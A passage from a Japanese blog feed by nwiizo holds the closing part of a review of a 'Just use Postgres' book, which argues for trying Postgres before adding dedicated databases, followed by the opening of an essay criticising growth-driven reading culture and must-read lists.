RabbitMQ」確かに、それぞれの専用ソリューションは強力です。でも、それぞれが運用コストを生みます。バックアップ、モニタリング、アラート、障害対応、バージョンアップ。全てがチームの負担になります。そして、構成図に新しいアイコンが増えるたびに、誰かが「これ誰がメンテするんですか？」と聞く声が聞こえます。「Just use Postgres」は、その複雑化への抵抗です。もちろん、これは「新しい技術を学ぶな」という意味ではありません。新しいツールやサービスが出てきたとき、まず「運用時にどうなるか」を考える。それがベテランエンジニアに求められる姿勢だと思います。機能の魅力だけでなく、3 年後にメンテナンスできる人がいるか、障害時に対応できるか、既存システムとの整合性はどうか。これは Postgres の新機能についても同じです。pgvector は便利ですが、まだ運用実績が浅い。TimescaleDB も Postgres の拡張とはいえ、独自のアップグレードパスがあります。「Postgres だから安心」ではなく、その機能の成熟度を見極める必要があります。結局のところ、謙虚に学び続けるしかありません。新しい技術も、既存の技術も。私が最近考えている技術選定の基準があります。替えの利く技術は、流行に従う替えの利きづらい基盤は、標準に従う競争優位の核は、自ら設計するPostgres は、競争優位の核になる場合もありますが、基本的には「替えの利きづらい基盤」であることが多いです。だからこそ、40 年の実績がある標準的な選択肢を使い、その可能性を最大限に活かす。それが、この本から学んだことです。もちろん、Postgres で解決できないユースケースもあります。著者は正直にそれを認めています。でも、試す前から諦めるのではなく、まず Postgres で試してみる。それで十分なら、アーキテクチャはシンプルなままです。この本を読み終えて、次に「〇〇が必要だから△△を導入しましょう」と言われた時、私は自信を持って聞き返せるようになりました。「Postgres で試しましたか？」おわりに読むことと、手を動かすこと11 章を読み終えて、私は 1 つの疑問を持っていました。「本当に、Postgres でこれだけのことができるのか？」本に書いてあることを読んで「なるほど」と思うのと、実際に動かして確認するのは、全く別の体験です。少なくとも、私にとっては。だから、手を動かすことにしました。Docker で Postgres を立てて、Rust でコードを書いて、各章の内容を 1 つずつ検証しました。generate_series から始まって、CTE、Window Functions、Recursive Query と進みました。JSONB、全文検索、pgcrypto、pgvector、TimescaleDB、PostGIS、そしてメッセージキュー。全 11 章です。その過程で、いくつかのことに気づきました。手を動かして初めてわかったこと本を読んでいるときは「ふーん」と思っていたことが、実際に動かすと「あ、そういうことか」に変わる瞬間があります。例えば、FOR UPDATE SKIP LOCKED。本には「複数のコンシューマーが並行してメッセージを取得できる」と書いてありました。でも、実際に 2 つのワーカーを同時に動かして、それぞれが異なるメッセージを取得するのを見たとき、初めて腑に落ちました。Worker 1 がメッセージ 1 を取得: {\\"service\\":\\"registration\\",\\"visitor\\":\\"Alice\\"}Worker 2 がメッセージ 3 を取得: {\\"service\\":\\"registration\\",\\"visitor\\":\\"Charlie\\"}この出力を見て、「ああ、本当にブロックせずにスキップしてるんだ」と思いました。言葉で理解することと、目で見て理解することは、違うものです。他にも気づきはありました。pg_typeof() の結果を Rust で取得しようとしたらエラーになって、::TEXT でキャストする必要があることを知りました。PL/pgSQL の変数名がテーブルのカラム名と衝突してエラーになることも知りました。TEMP TABLE の名前が別のデモと衝突して、「なんでエラーになるんだ？」と 30 分悩んだこともあります。これらは本には書いてありません。当たり前です。本は概念を説明するものであって、私が遭遇するエラーを予測するものではないから。でも、そういうエラーと向き合う時間こそが、理解を深める時間だったと思います。判断基準が見えてきた11 章を読み終えて、そして検証を終えて、私の中に 1 つの判断基準ができました。「いつ Postgres で十分で、いつ専用ツールを検討すべきか」全文検索なら、数百万件以下のシンプルな検索であれば Postgres で十分です。ただし数億件規模や日本語の形態素解析、複雑なファセット検索が必要なら、Elasticsearch を検討すべきです。ベクトル検索なら、pgvector で数百万ベクトルまでは対応できます。でも、数億ベクトル規模やリアルタイム更新が必要なら、Pinecone や Milvus の出番です。メッセージキューなら、秒間数百メッセージ程度なら Postgres で十分です。でも、秒間数万メッセージや複雑なルーティングが必要なら、RabbitMQ や Kafka を使うべきです。この判断基準は、本を読んだだけでは身につかなかったと思います。実際に動かして、限界を感じて、初めてわかることがありました。「Postgres で試した？」この本を読み始める前、私はこの言葉を言えませんでした。「全文検索が必要です」と言われたら、「Elasticsearch ですね」と即答していました。「時系列データを扱いたい」と言われたら、「InfluxDB か TimescaleDB ですね」と答えていました。TimescaleDB が Postgres の拡張であることすら、あまり意識していませんでした。今は違います。「全文検索が必要です」と言われたら、「どのくらいのデータ量ですか？　検索の要件は？　まず Postgres の tsvector で試してみませんか？」と聞き返せます。「ベクトル検索がしたい」と言われたら、「pgvector で試してみましょうか。数百万ベクトルくらいなら対応できますよ」と提案できます。それが良いことなのかどうか、正直わかりません。もしかしたら、早めに専用ツールを導入した方が、長期的には幸せだったかもしれません。Postgres で頑張った結果、パフォーマンスの壁にぶつかって、結局移行することになるかもしれません。でも、少なくとも「試した上で判断する」ことはできるようになりました。「Postgres で試した？」その一言を、自信を持って言えるようになりました。そして、自分自身にも問いかけるようになりました。新しいデータベースを追加する前に、まず Postgres で試してみる。それで十分なら、アーキテクチャはシンプルなままです。運用負荷も増えません。深夜 3 時のアラート対応の可能性も、1 つ減ります。それだけで、この本を読んだ価値はあったと思います。最後に11 章分の感想を書いて、検証コードを書いて、そしてこの「おわりに」を書いています。読み始めたときは、「Postgres の可能性を広げる本」だと思っていました。読み終えた今は、「技術選定の視点を変える本」だったと思っています。「最適なツールを選ぶ」という言葉は、聞こえが良いです。でも、その「最適」は何を基準にしているのでしょうか。機能の豊富さ？　パフォーマンス？　それとも、運用の複雑さ？この本は、「十数年単位の運用の複雑さ」という視点を私に与えてくれました。新しいデータベースを追加することは、コストです。学習コスト、運用コスト、監視・バックアップ・障害対応の複雑化。全てがチームの負担になります。既に Postgres を使っているなら、まず Postgres で試してみる。それで十分なら、そのコストを払わなくて済みます。それが「Just use Postgres」の本当の意味だと、今は思っています。「できる」と「やるべき」の違いこの本を読んで、1 つ注意しなければならないことがあります。「Postgres でできる」と「Postgres でやるべき」は、違います。本書は Postgres の可能性を示してくれますが、すべてのユースケースで Postgres を選ぶべきだとは言っていません。著者自身も、専用ツールが必要な場面があることを認めています。大事なのは、選択肢を知った上で判断することです。「Postgres でもできるけど、このユースケースでは Kafka の方が適している」と判断するのと、「Postgres でできることを知らずに Kafka を選ぶ」のでは、意味が違います。前者は informed decision、後者は思い込みです。この本は、その informed decision をするための知識を与えてくれました。チームと知識の継承もう 1 つ、この本を読んで考えたことがあります。技術選定は、個人の問題ではありません。チームの問題です。新しいデータベースを導入するということは、チームメンバー全員がそれを学ぶ必要があるということです。障害対応できる人が増えなければ、特定の人に負荷が集中します。その人が退職したら、知識が失われます。Postgres を選ぶということは、チームの認知負荷を抑えるという選択でもあります。多くのエンジニアが Postgres の基本を知っています。採用市場でも、Postgres 経験者を見つけるのは比較的容易です。ドキュメントも豊富で、コミュニティも活発です。「技術的に最適」と「チームにとって最適」は、必ずしも一致しません。十数年単位で考えたとき、チームの持続可能性も重要な判断基準です。謙虚に学び続けることこの本を読んで、もう 1 つ気づいたことがあります。10 年近くこの仕事をしていても、知らないことはたくさんあります。Recursive CTE の活用パターン、BRIN インデックスの使い所、FOR UPDATE SKIP LOCKED の仕組み。どれも Postgres に昔からある機能ですが、実務で使う機会がなければ、深く理解することはありませんでした。新しい技術が出てきたとき、いきなり飛びつくのは危険です。でも、既存の技術の可能性を見落としているのも、同じくらい問題です。これは Postgres の新機能についても同じです。pgvector や TimescaleDB は便利ですが、Postgres 本体と比べれば運用実績は浅い。「Postgres を使う」という判断と、「Postgres の新機能を本番投入する」という判断は、別々に評価する必要があります。結局のところ、謙虚に学び続けるしかありません。はじめにでも書きましたが、私は技術選定についてこう考えています。替えの利く技術は、流行に従う替えの利きづらい基盤は、標準に従う競争優位の核は、自ら設計するPostgres は、競争優位の核になる場合もありますが、基本的には「替えの利きづらい基盤」であることが多いです。だからこそ、流行りの新しいデータベースに飛びつく前に、まず Postgres で何ができるかを確認する。それが、この本から学んだ姿勢です。もちろん、Postgres で全てが解決できるわけではありません。本当に専用ツールが必要な場面もあります。大事なのは、「試した上で判断する」ことです。最適解を求めて複雑さを増やすより、十分解でシンプルさを保つ方が、長期的には幸せなことが多いです。少なくとも、深夜 3 時のアラート対応は減ります。それは、間違いありません。参考書籍失敗から学ぶRDBの正しい歩き方 Software Design plus作者:曽根 壮大技術評論社AmazonSQLアンチパターン 第2版 ―データベースプログラミングで陥りがちな失敗とその対策作者:Bill Karwinオーム社Amazonセンスの良いSQLを書く技術　達人エンジニアが実践している３５の原則作者:ミックKADOKAWAAmazon","isoDate":"2025-11-25T04:52:20.000Z","dateMiliSeconds":1764046340000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"おい、本を読め","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/24/043314","contentSnippet":"はじめに私は本を読むのが好きです。朝、コーヒーを淹れて、ソファに座って、ページを開く。その時間が好きです。物語の中に入り込んで、登場人物の人生を追いかけ、著者の思考を辿り、知らない世界を覗き見る。ただ、それが楽しいんです。でも、誰かに「最近、何か読んだ？」と聞かれて、タイトルを答えると、必ず次の質問が来ます。「へえ、面白かった？ 何か学びはあった？」あるいは、こんな質問が来ます。「その本、どういうジャンル？ 自己啓発系？ノンフィクション？」違和感があります。映画を見たあと、「何か学びはあった？」なんて聞かれません。音楽を聴いたあと、「それ、自己啓発系？」なんて聞かれません。ゲームをクリアしたあと、「成長できた？」なんて聞かれません。でも、本だけは違います。読書には、常に「目的」が求められます。「成長のため」「知識を得るため」「キャリアアップのため」。ただ楽しいから読む、では許されない空気があります。SNSを開けば、「読書のすすめ」が溢れています。「本を読まない人は生き残れない」「年間百冊読めば人生が変わる」「ビジネスパーソン必読書」。どれも善意です。本当に、善意なんです。でも、その善意が、読書を窮屈にしています。私が小説を読んでいると言うと、「へえ、小説なんだ」と言われます。その「なんだ」という響きに、少しだけトゲがあります。まるで、「ビジネス書じゃないんだ」「役に立つ本じゃないんだ」と言われているような。あるいは、ミステリを読んでいると言うと、「息抜きにはいいよね」と言われます。その「息抜き」という言葉に、少しだけ違和感があります。まるで、本来読むべきは「ちゃんとした本」で、娯楽はその合間に挟むもの、と言われているような。おかしくないですか？ 映画は娯楽として認められています。音楽は娯楽として認められています。ゲームは娯楽として認められています（最近は、ですけど）。でも、読書だけは、娯楽であることを許されていません。「ただ楽しいから読む」では、ダメなんでしょうか。物語に没入して、現実を忘れる。登場人物に共感して、泣いたり笑ったりする。推理小説でハラハラして、犯人を当てようとする。SF小説で想像力を膨らませて、知らない世界に思いを馳せる。それだけじゃ、ダメなんでしょうか。この文章を書いている今も、矛盾しています。私は「読書について考えている私」を演出しているのだろう。この文章を投稿したら、何人かが「わかる」って言ってくれるだろう。その承認が欲しいのだろう。でも、それでも書きたいんです。なぜ読書だけが、娯楽であることを奪われるのか。なぜ読書だけが、「成長」や「学び」と結びつけられるのか。そして、その結びつきが、どれだけ読書を窮屈にしているのか。この文章は、その違和感から始まります。答えを出すつもりはありません。ただ、この違和感を言葉にしてみたいんです。もしかしたら、あなたも同じ違和感を抱えているだろう。「ただ楽しいから読む」という、当たり前のことが、当たり前じゃなくなっている世界。その世界を、少しだけ問い直してみませんか。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、はじめていきます。加速文化という病私たちは走り続けています私たちは、「加速文化」の中を生きています。現代社会では変化のスピードが絶え間なく加速し、個人も常に成長し続けることを要求されます。「走り続けること」そのものが目的化し、どこに向かっているのか、なぜ走っているのかという本質的な問いは置き去りにされます。「もっと成功しろ」「もっと幸せになれ」「スキルを身につけろ」「成長し続けろ」。現代社会は、こうした強烈なプレッシャーを発し続けます。「もっと」という言葉は、終わりのない要求を意味します。どれだけ達成しても、常に「もっと」が待っています。誰かと比べずにはいられませんSNSを開けば、誰かが何かを達成しています。誰かが本を出版しています。誰かが転職に成功しています。誰かが新しいスキルを身につけています。私たちは比較せずにいられません。そして、比較するたびに自分を劣っていると感じます。「自分は何もしていない」「自分は成長していない」「自分は遅れている」。SNSは、他者の「成功」を可視化し、価値を数値化します。しかし、SNSに現れるのは、他者の「ハイライト」だけです。私たちは自分の未編集の人生と、他者の編集済みの人生を比較してしまいます。より問題なのは、この比較が内面化されることです。自分の中に「比較する目」が住み着きます。常に自分を評価する目。「これは成長でしょうか」「これは生産的でしょうか」。この内なる審判者は、決して満足しません。その基準は加速文化から与えられ、常に「もっと」を要求するからです。だから、走らなければなりません。これは、まるでトレッドミルで走っているようなものです。動いているという実感だけがあって、前進しているという実感はありません。『鏡の国のアリス』の赤の女王が言ったように、「同じ場所にとどまるためには、全力で走り続けなければならない」のです。安定したいから成長したい、というおかしさここに、現代の最も奇妙な矛盾があります。「安定したいから成長したい」。「安定」と「成長」は、本来相反する概念です。安定とは、変化しないこと。成長とは、変化し続けること。なのに、私は「安定したいから成長したい」と言っています。なぜこの矛盾が成立するのでしょうか。「変化する環境の中で生き残るためには、変化し続けなければならない」という論理があるからです。つまり、「安定」は、もはや「変化しないこと」では達成できません。「変化し続けること」によってのみ達成できるのです。しかし、この論理は実は安定を永遠に延期しています。「いつか安定する」という約束のもとで、今は変化し続けます。でも、その「いつか」は決して来ません。終わりのない変化を、「安定」という言葉で正当化しています。不安が売られていますこのロジックは、巧妙なマッチポンプを生み出します。「成長しなければ生き残れない」という不安を煽り、成長のための商品やサービスを売ります。読書、セミナー、資格、転職支援、コーチング。このシステムの巧妙さは、被害者が加害者になることです。私は不安を抱え、本を買い、その経験を「成功体験」として語ります。この語りは、他者に同じ不安を伝染させます。そして、その最も基本的で、最も無害に見えて、最も広く受け入れられているのが「読書」なのです。読書は知的で文化的です。読書を批判することは、知性を否定することのように聞こえます。だから、「読書のすすめ」は抵抗なく受け入れられます。でも、それが実は加速文化の最前線にあるのです。やりたいことがわかりませんここには、もう1つの構造的な問題があります。私たちには、やりたいことがわかりません。「やりたいことを見つけろ」と言われ続けます。就活でも、転職でも、キャリア面談でも。自己分析をしろ。強みを見つけろ。情熱を持て。でも、そんなもの、簡単に見つかるわけがありません。むしろ、「やりたいことを見つけろ」というプレッシャーそのものが、私たちを追い詰めます。「やりたいことがない自分はダメだ」「情熱がない自分は劣っている」。「やりたいこと」は、発見するものではなく、構築するものです。様々な経験の中で、試行錯誤の中で、少しずつ形成されていくものです。にもかかわらず、現代社会は「今すぐ見つけろ」と命令します。ここに、加速文化の最も陰湿な側面があります。加速文化は、「やりたいことを見つけろ」と言いながら、実は「やりたいことを見つける時間」を奪っています。常に何かに追われています。常に次のタスクがあります。その結果、立ち止まって考える余裕がありません。「やりたいこと」を見つけるためには、時間が必要です。無為な時間、退屈な時間、何もしない時間。でも、加速文化は、その時間を「無駄」と見なします。「生産的」ではないから。その結果、私たちは「やりたいこと」を見つけられないまま、「やりたいことを見つけなければ」という焦燥だけを抱え続けます。潰しがきく選択肢という罠その結果、私は「とりあえず潰しがきく選択肢」に逃げ込みます。やりたいことはわかりません。でも、「汎用性の高いスキル」を身につけておけば、将来の選択肢が増えます。どこでも通用します。だから、とりあえずそれを目指そう。これは、一見合理的に見えます。でも、ここに罠があります。「汎用性の高いスキル」は、AIが最も得意とすることなのです。ロジカルシンキング。データ分析。プログラミング。外国語。これは確かに重要です。でも、これはすべて、AIに置き換えられつつあります。人間がAIに勝てるのは、「汎用性」ではありません。「固有性」です。その人だけが持つ価値観。その人だけが面白いと思うこと。その人だけが執着すること。それこそが、AIに代替されない価値です。でも、私は「やりたいことがわからない」まま、「汎用的なスキル」だけを積み上げています。その1つが「読書」です。何を読めばいいかわからないから、「必読書リスト」に従います。リストに従っていれば、「成長している」気分になれます。でも、それは本当に自分が読みたい本なのでしょうか。その結果、私は「やりたいこと」が空っぽなまま、知識だけを積み上げています。人格や欲望にもとづく価値基準が不在のまま、汎用的な情報を消費し続けています。そして、何も変わりません。やりたいことがわからないのに、知識だけ増えていきます。ここでも、本は読んだが問いは増えていません。実は読んでいませんここで、より深刻な問題に気づきます。私たちは、読書すらしていません。本を買っているだけ、リストを眺めているだけ、動画を見ているだけなのです。これらの行為は、「成長の記号」を消費しています。記号を消費しても、実体は得られません。記号としての「読書」を消費しても、読書の実体である「思考の格闘」は得られません。記号としての「知識」を消費しても、知識の実体である「理解」は得られません。記号としての「成長」を消費しても、成長の実体である「変容」は得られません。本を買います。Amazonでポチります。書店でレジに持っていきます。その瞬間、「私は成長しようとしている」という感覚が得られます。購入という行為が、「成長への意志」を示す儀式として機能しています。金を払います。その対価として、「私は成長しようとしている」という自己イメージを得ます。実際に本を読むよりも、はるかに安い買い物です。でも、そのあと自分の中に新しい疑問は生まれたでしょうか。必読書リストを眺めることもあります。「ビジネスパーソン必読書50選」「今年読むべき本ベスト10」。知っている本が何冊かあります。「ああ、これは読んだ」。そして、知らない本をメモします。「いつか読もう」。道筋が見えているだけで、目的地に近づいた気がします。実際には一歩も進んでいないのに。でも、そこに疑問はあるでしょうか。違和感は。より手軽なのが書籍まとめ動画です。10分の動画で得られるのは、本の「結論」だけです。しかし、本の価値は、結論だけにあるのではありません。むしろ、結論に至るまでの過程にこそ、価値があります。著者がどう考え、どう格闘したか。その過程を経験することで、読者の思考が鍛えられ、価値観が揺さぶられ、問いが生まれます。でも、動画は結論だけを与えます。そして、結論だけを知っても、自分は変わりません。疑問も、違和感も、何も残っていません。でも、記号の消費は、心地よいのです。なぜなら、実体を得るよりも、はるかに簡単だから。本を読むには、時間がかかります。理解するには、努力がかかります。変わるには、苦痛が伴います。でも、本を買うのは一瞬です。リストを眺めるのは数分です。動画を見るのは10分です。そして、それでも「成長した気」になれるなら、なぜ本を読む必要があるのでしょうか。こうして、私たちは読書すらしなくなります。アルゴリズムと必読書リスト仮に本を読むとしても、そこには2つの問題があります。1つ目は、アルゴリズムによる自己隷属です。「読書は自由だ」とよく言われます。でも、私は「自由に本を選んでいる」と思いながら、実際には既存の自分の枠内でしか選んでいません。「読みやすい本」「共感できる本」。自分を変えない本ばかりを選び、それを「自由」と呼んでいます。そもそも、「自分の好み」が変わっていかないなら、読書なんてなんのためなのでしょうか。読書の本質的な目的は、自分を変えることです。でも、私の「好きな本を読む」という自由は、実は「今の自分を肯定する本を読む」という自己隷属になっています。ネット書店のおすすめ。SNSのタイムライン。「あなたにおすすめの本」。これはすべて、「あなたの好みに合った本」を提示します。しかし、よく考えてみてください。アルゴリズムは、何を最適化しているのでしょうか。私の成長ではありません。私の満足度です。アルゴリズムの目的は、私に本を買わせること、私を長くサイトに留めることです。だから、アルゴリズムは、私が「気に入りそうな」本を推薦します。でも、私が「気に入る」本は、私を変えません。アルゴリズムは、私の周りに見えない壁を作ります。その壁の内側には、私にとって快適な情報だけがあります。そして、私はその快適さを「自由」と呼びます。でも、それはおそらく本当の自由ではありません。2つ目は、必読書リストという新たな隷属です。アルゴリズムに違和感を覚えた私は、「必読書リスト」に向かいます。「アルゴリズムに選ばされるのはイヤだ」「自分の好みだけで選ぶのは狭い」。だから、他者が選んだ、推奨された、「読むべき」とされる本のリストに従います。確かに、自分では選ばない本を読むことは重要です。でも、決定的な違いがあります。本来のリスト読書は、問いを獲得するための冒険です。でも、現代の「必読書リスト」は、答えを得るための効率化になっています。ここで、二種類のリストを区別してみたいと思います。第一のリストは、古典のリストです。プラトン、カント、ニーチェ、ドストエフスキー。これらの古典を読むことは、苦痛を伴います。理解できません。でも、その理解できなさの中で、自分の価値観が揺さぶられます。「正義とは何か」「自由とは何か」。根源的な問いに直面します。そして、その問いと格闘することで、自分が変わります。第二のリストは、必読書のリストです。「ビジネスパーソン必読書50選」。これらのリストは、「今求められている知識」を効率的に獲得することを目的とします。読みやすく、すぐに役立ち、何より安心できます。「このリストに従っていれば、遅れない」と。でも、それは幻想でしょう。なぜなら、リストを消化しても、問いを獲得していません。必読書リストは、私たちの問いを奪っているかもしれません。「何を読むべきか」「何が重要か」「何のために読むか」。これらを全て他者が決めます。結果として、自分で問いを立てる力が育ちません。自分の価値基準が形成されません。「やりたいこと」が空っぽなままです。でも、リストを消化することで達成感を得られます。だから、また次のリストを探します。アルゴリズムもリストも、「何を読むか」は教えてくれます。でも「なぜ読むのか」「読んだあと、どんな問いと一緒に生きていくのか」は教えてくれません。なぜ私たちはリストに従うのでしょうか。選択の責任からの逃避と、不安の一時的な解消のためです。リストがあれば、「何を読めばいいかわからない」という不安は解消されます。これは、不安の麻酔のようなものです。根本的な解決ではありませんが、痛みを一時的に和らげます。なぜ「もっと読まなきゃ」が終わらないのか読書体験が「数字」に変わるとき本を読むとき、何が起きているでしょうか。物語に没入します。考えが揺さぶられます。知らない世界を覗き見ます。その時間が、楽しい。それが、読書体験です。でも、いつの間にか、別のものを数え始めます。「今月、何冊読んだか」「必読書リストを、どこまで消化したか」「読書時間は、何時間か」。読書体験そのものではなく、読書したという事実が大事になっています。体験は、数字に変換されます。数字は、比較できます。競争できます。SNSに投稿できます。でも、体験そのものは、比較できません。見せられません。だから、数字のほうが「価値がある」ように見えてしまいます。こうして、読書から、読書体験が抜け落ちます。残るのは、数字だけです。満たされない構造ここに、厄介な問題があります。数字は、決して満たされません。50冊読みました。でも、100冊読んでいる人がいます。必読書を読みました。でも、原書で読んでいる人がいます。どれだけ達成しても、「もっと」が待っています。これは、あなたの問題ではありません。構造の問題です。数字による評価は、比較によって成り立っています。他者より多く。他者より速く。他者より難しく。差があるから、価値がある。でも、差は常に脅かされています。だから、新しい差を作らなければなりません。終わりがないのは、そういう仕組みだからです。満たされないのは、あなたが足りないからではありません。満たされないように、できているのです。「楽しむ」が難しい理由「だったら、数字なんか気にせず、楽しめばいい」。その通りです。でも、それが難しい。なぜか。評価される側として生きてきたからです。学校では成績。会社では業績。SNSではいいねの数。私たちは、常に評価されてきました。だから、何かをするとき、無意識に「これは評価されるだろうか」と考えます。本を読むときも、「これは意味があるだろうか」と考えます。評価の目が、内面化されています。自分の中に、審判者が住んでいます。だからこそ、意識的に選ぶ必要があります。数字を追いかけない。比較しない。評価されなくても、読み続ける。これは、単なる心がけではありません。評価の構造からの、意識的な離脱です。完全に離脱する必要はありません。評価を気にする気持ちは、消えません。それは自然なことです。でも、評価を唯一の基準にしないこと。これは可能です。読書が楽しければ、それでいい。年間10冊でも、それでいい。リストを無視しても、それでいい。評価されなくても、読み続けられる。その回路を持つこと。それが、終わりのないループから抜け出す方法です。永遠に満たされない不安のループ数字を追いかける構造と、評価の内面化。この2つが組み合わさると、恐ろしいループが生まれます。「生き残らなきゃ」という不安から始まり、「成長しなきゃ」という焦燥、「読書しなきゃ」という義務感へと続きます。必読書リストを探し、リストを見る、本を買う、動画を見ます。そして「成長した気分」を得ます。しかし問いを獲得していないので、自分は変わっていません。「まだ足りない」と感じます。より多くのリスト、より多くの本、より多くの動画を求めます。そして最初に戻ります。不安は解消されていません。これが、「読書のすすめ」が永遠にバズり続ける理由でしょう。このループは自己強化的です。ループを回るほど、「成長した気分」と「実際の成長」の乖離が大きくなります。私たちは本を買い、動画を見、リストを消化しています。でも、何も変わっていません。その乖離に薄々気づきながらも、認めたくありません。だから、もっと本を買います。そう信じて、ループを回し続けます。なぜ「読書のすすめ」がバズるのでしょうか。『本を読めば変われる』という物語は、不安を和らげるのではなく、不安を生産しています。この物語を読むたびに、「自分は十分に本を読んでいない」でしょう。そして、その不安が、また「読書のすすめ」を求めさせます。巧妙なマッチポンプです。このループから抜け出せないのは、問いが不在だからでしょう。「なぜ読むのか」「何のために読むのか」。この問いがないまま、ただリストを消化します。だから、終わりがありません。本は読みました。けれど、問いは増えていません。だからまた不安になり、次の「読書のすすめ」を探します。私にとって読書とは何かここまで、「成長のための読書」という物語を批判してきました。「本を読まなきゃ」というプレッシャー。「年間100冊」という数値目標。「必読書リスト」という他律的な選択。そして、読書体験を数字に変換し、評価を内面化する構造。これは確かに、読書を窮屈にしています。でも、だからといって、成長すること自体を否定したいわけではありません。私にとって、読書とは、問いを獲得するための冒険です。答えを得るために本を読むのではなく、問いを見つけるために読みます。既存の自分を確認するのではなく、自分を変えるために読みます。安心するために読むのではなく、不安になるために読みます。読書を通じて、自分が変わります。価値観が揺さぶられます。新しい視点を得ます。世界の見え方が変わります。それは、成長です。しかし、それは「成長しなければならない」という義務から生まれる成長ではありません。「年間100冊読めば人生が変わる」という約束に従う成長でもありません。「必読書リスト」を消化することで得られる成長でもありません。それは、読書そのものを楽しむ中で、結果として起こる成長です。物語に没入して、登場人物の選択に心を揺さぶられます。その結果、自分の価値観が変わります。哲学書を読んで、理解できない文章に格闘します。その結果、新しい問いが生まれます。小説を読んで、知らない世界を覗き見ます。その結果、自分の世界が広がります。これは全て、「成長しよう」と思って起こることではありません。ただ楽しんでいたら、結果として起こる変化です。そして、その変化が周りの環境に合っていたら、「成長」と呼ばれます。合わなかったら、ただの変化です。でも、どちらでもいいんです。変化そのものに価値があります。それが「成長」という名前で呼ばれるかどうかは、環境次第です。社会の基準次第です。時代次第です。読書を通じて、自分が変わります。その変化が、たまたま今の環境で「成長」と評価されるだろう。評価されないだろう。でも、それは二の次です。重要なのは、自分が変わったということ。新しい視点を得たということ。世界の見え方が変わったということ。それだけです。だから、こう言いたいのです。読書は、楽しんでいいんです。「何か学びはあったか」なんて気にしなくていいです。「問いは増えたか」なんて確認しなくていいです。「成長できたか」なんて測定しなくていいです。ただ、その時間が楽しければいいです。物語に没入して、現実を忘れる。それだけで十分です。登場人物に共感して、泣いたり笑ったりする。それだけで十分です。推理小説でハラハラして、犯人を当てようとする。それだけで十分です。そして、もし読み終わったあとに、何かが変わっていたら。新しい問いが生まれていたら。それは、ボーナスです。でも、それは目的ではありません。結果です。楽しむことが目的で、成長は結果です。この順序を、逆にしてはいけません。「成長するために読む」ではなく、「楽しんで読んでいたら、結果として成長していた」。これが、私にとっての読書です。読書そのものは、必ずしも人格を育てるわけではありません。むしろ劇薬と言えます。興味の赴くままただ読むのは、時に有害でさえあります。歴史を振り返れば、独裁者も大量虐殺者も、大読書家でした。彼らは膨大な本を読みました。それが彼らを善き人間にしたわけではありません。読書は道具です。道具は、使い方次第で、善にも悪にもなります。では、どう読めばいいのでしょうか。鍵になるのは自発性です。本とテレビ・YouTube・Podcastの決定的な違いは、本が「自発」を要求することです。本は、私が選ばなければ私の手の中にやってきません。本は、私が目を動かさなければ、語り始めてくれません。本は、私が理解しようとしなければ、ただの記号の羅列です。つまり、本を読むためには、能動的かつ自発的に読者が働きかけなければなりません。一方、テレビやYouTube、Podcastは、一方的に情報を流し込んできます。受動的に消費できます。画面を見ていれば、音声を聞いていれば、情報は入ってきます。思考は不要です。この違いこそが決定的です。自発性こそが、思考を生みます。受動的に与えられた情報は、思考を生みません。ただ受け取り、ただ流れるだけです。しかし自発的に獲得した情報は、思考を生みます。なぜなら、獲得するプロセスですでに思考しているからです。だからこそ、本を読むときは「どんな問いを持ってページを開くか」が決定的になります。読書によって得られるものは、考えること。疑問をもつこと。異議を申し立てることです。読書の真の効用は、ここにあります。世の中の常識とされていること、あたりまえと受け入れられている前提を、疑ってかかります。「本当にそうなのか」「なぜそうなのか」「他の可能性はないのか」。こういう問いを持つことが、読書の本質です。この問いを持つ人間は、システムにとって邪魔な存在です。システムが必要としているのは、考えない労働者、考えない消費者です。言われたことを黙って実行する人間。与えられた情報を疑わずに受け入れる人間。しかし読書する人間は、疑います。問います。異議を唱えます。だから、システムは読書を骨抜きにしようとします。「読書のすすめ」を発信します。「必読書リスト」を作ります。「要約動画」を提供します。そうすれば、私たちは本を読みます。けれども考えません。疑いません。問いません。ただ、与えられた情報を消費するだけです。これは読書ではありません。読書の形をした、情報消費です。ここで、現代の読書が抱える問題に気づきます。思考の型を学ぶことが、思考停止を生んでいます。「MECE」「ロジックツリー」「仮説思考」。これらは有用な道具です。しかし「型」を覚えることが目的になると、「型」に縛られ、「型」の外側を見なくなります。世界は、「型」に当てはまらないもので満ちています。むしろ、「型」に当てはまらないものこそが、面白く、新しく、価値があります。もう1つの問題は、作業をすることが、目的化してしまうことです。本を読む、ページをめくる、線を引く、メモを取ります。これらの「作業」をすることで、「自分は頑張っている」という実感を得ます。しかし、読書は本来「作業」ではありません。読書は、思考です。格闘です。問いとの対話です。ページ数をカウントし、読書時間を記録し、読了数を競います。読書を「作業」として扱った瞬間、読書は死にます。読書とアイデンティティの罠ここまでは、読書の「方法」について語ってきました。読書にはもう1つ、深刻な問題があります。読書が、アイデンティティの道具になる時です。「積読」という現象があります。買ったけど読んでいない本が積まれている状態。多くの読書家が、この積読に悩んでいます。「読まなきゃ」「もったいない」「時間がない」。しかし別の角度から見ることもできます。積読は、ファッションです。本棚は、なりたい自分の姿、未来の自分への約束です。読める読めないは別として、難しい本を買ってしまいます。哲学書を買います。古典を買います。専門書を買います。それらを本棚に並べます。本棚の「面構え」が変わります。そして、その本棚を見るたびに、「私はこういう人間でありたい」でしょう。これは、服を買うのと同じです。服を買う時、私たちは「今の自分」に合う服だけを買うわけではありません。「なりたい自分」をイメージして、その自分に相応しい服を買います。そして、その服を着ることで、少しずつ、その自分に近づいていきます。本も同じです。「こういう本を読む人間でありたい」「こういう思考ができる人間になりたい」。そのイメージが、本棚を作ります。そして、その本棚に引っ張られて、自分がそれに相応しい人間になろうとします。ここまでは問題ありません。むしろ、これは積極的に肯定すべきことです。積読は、未来の自分への投資です。今は読めなくても、いつか読めるようになります。今は理解できなくても、いつか理解できるようになります。そう信じて、本を買います。それは、自己形成の1つのプロセスです。問題は、このアイデンティティが、他者との差異化の道具になる時です。ここで、「文化資本」という考え方が参考になります。経済的な資本（お金や資産）とは別に、教養や知識、趣味といった文化的な要素も、社会的な価値を持ちます。高い教育を受けた人、芸術に詳しい人、本をたくさん読む人。こうした人々は、その知識や教養によって、社会的な地位や信頼を獲得します。つまり、文化もまた、資本のように蓄積され、交換され、価値を生み出すのです。読書も、この構造の中にあります。「私は本を読む」という行為は、「私は教養がある」というシグナルを発します。そして、そのシグナルは、「本を読まない人」との境界線を引きます。この境界線は、善意によって引かれます。「もっと本を読